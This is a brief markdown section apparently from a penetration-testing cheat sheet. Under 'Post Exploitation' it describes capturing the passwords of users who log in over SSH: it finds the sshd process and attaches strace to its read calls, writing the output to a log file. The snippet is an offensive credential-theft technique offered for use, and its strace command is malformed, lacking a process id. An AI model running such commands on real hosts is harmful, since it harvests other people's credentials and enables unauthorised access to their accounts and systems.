## Post Exploitation
Dump Passwords from Memory\
**Use Case**: If it is observed a user is regularly logging into a device (possibly automated script)
```
# Identify ssh daemon process id
ps aux |grep sshd
# Use strace to dump memory
strace -f -e read -p -qq -o brok3n_log
```
